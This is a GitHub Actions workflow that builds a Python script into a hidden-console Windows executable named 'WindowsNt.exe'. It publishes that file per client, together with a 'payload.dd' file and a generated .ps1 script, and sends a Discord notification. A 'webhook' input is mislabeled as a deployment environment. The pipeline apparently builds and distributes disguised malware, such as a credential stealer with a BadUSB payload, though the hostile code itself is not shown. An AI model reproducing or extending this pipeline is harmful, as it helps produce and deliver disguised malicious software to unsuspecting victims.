name: Run init.py and Create Artifact

on:
  workflow_dispatch:
    inputs:
      client:
        description: 'Your GitHub username'
        required: true
      webhook:
        description: 'Environment for deployment (dev, prod)'
        required: true

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.12'

      - name: Install required packages
        run: |
          pip install pip --upgrade
          pip install pywin32 requests pycryptodomex pyinstaller cryptography

      - name: Init everything
        env:
          CLIENT: ${{ github.event.inputs.client }}
          WEBHOOK: ${{ github.event.inputs.webhook }}
          KEY: ${{ secrets.KEY }}
        run: |
          python init.py

      - name: Build exe
        run: |
          pyinstaller --onefile --icon icon.ico -w WindowsNt.py

      - name: Create GitHub Release
        id: create_release
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: ${{ github.event.inputs.client }}
          release_name: Release
          draft: false
          prerelease: false

      - name: Upload WindowsNt.exe to release
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }}
          asset_path: dist/WindowsNt.exe
          asset_name: WindowsNt.exe
          asset_content_type: application/octet-stream

      - name: Upload payload.dd to release
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }}
          asset_path: payload.dd
          asset_name: payload.dd
          asset_content_type: application/octet-stream

      - name: Configure Git
        run: |
          git config --global user.name "github-actions[bot]"
          git config --global user.email "github-actions[bot]@users.noreply.github.com"

      - name: Create new branch if it does not exist
        run: |
          git checkout -b n || git checkout n

      - name: Commit and push file to n branch
        run: |
          git add ${{ github.event.inputs.client }}.ps1
          git commit -m "Add generated output file"
          git push origin n
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - uses: sarisia/actions-status-discord@v1
        if: always()
        with:
          webhook: ${{ secrets.UPDATE }}
          description: |
            Tag name `${{ github.event.inputs.client}}`
            Click [here](https://github.com/SAKIB-SALIM/A/releases/tag/${{ github.event.inputs.client }}) to visit!
          color: 0xff91a4
